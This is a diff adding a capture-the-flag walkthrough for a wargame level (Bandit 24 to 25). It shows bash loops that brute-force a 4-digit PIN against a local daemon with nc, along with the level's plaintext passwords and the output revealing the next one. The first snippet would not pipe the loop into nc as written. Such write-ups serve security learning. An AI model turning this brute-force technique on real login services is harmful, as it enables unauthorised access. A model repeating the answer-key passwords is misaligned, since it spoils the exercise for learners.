@@ -935,8 +935,70 @@ may want to keep a copy around...
     ssh bandit24@bandit
     ```
 
+## Level 24 -> 25
 
-<!-- ## Level 24 -> 25 -->
+A daemon is listening on port `30002` and will give you the password for 
+`bandit25` if given the password for `bandit24` and a secret numeric 4-digit 
+pincode. 
+
+There is no way to retrieve the pincode except by going through all of the 10000 
+combinations, called brute-forcing.
+
+You do not need to create new connections each time.  
+
+---
+
+??? warning "Solution"
+
+    ```bash
+    nc localhost 30002
+    # I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
+    ```
+
+    So the format would be:
+    ```txt
+    password 1234
+    ```
+
+    `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
+
+    ```bash
+    nc localhost 30002;
+    for i in {1..9999}; do
+        printf "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 %04d\n" "$i";
+    done
+    ```
+    The `%04d` format specifier will zero-pad the digits, so that it will start at 
+    `0001` instead of just `1`.  
+
+
+    ---
+
+
+    ```bash
+    mkdir /tmp/b25
+    touch /tmp/b25/pass.txt
+    for i in {1..9999};
+        do printf "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 %04d\n" "$i" >> /tmp/b25/pass.txt;
+    done
+    nc localhost 30002 < /tmp/b25/pass.txt;
+    ```
+
+    Output:
+    ```txt
+    ...
+    Wrong! Please enter the correct current password and pincode. Try again.
+    Wrong! Please enter the correct current password and pincode. Try again.
+    Wrong! Please enter the correct current password and pincode. Try again.
+    Wrong! Please enter the correct current password and pincode. Try again.
+    Correct!
+    The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
+    ```
+
+    This writes all possible combinations to a file, then passes in each line as
+    input to the daemon listening on 30002. It will stop once the correct
+    combination is input.  
+
 
 <!-- ## Level 25 -> 26 -->
 
